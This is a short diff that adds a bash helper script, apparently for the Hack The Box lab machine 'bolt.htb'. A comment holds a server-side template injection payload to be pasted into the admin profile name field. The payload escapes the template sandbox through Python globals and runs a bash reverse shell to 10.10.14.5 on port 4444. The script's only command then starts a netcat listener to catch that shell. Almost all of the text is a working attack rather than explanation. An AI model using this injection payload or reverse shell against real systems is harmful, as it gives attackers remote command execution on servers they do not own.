@@ -1,0 +1,6 @@
+#!/bin/bash
+
+# make sure to put this in the name section of Settings -> http://demo.bolt.htb/admin/profile
+# {{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"').read() }} 
+
+nc -lvnp 4444
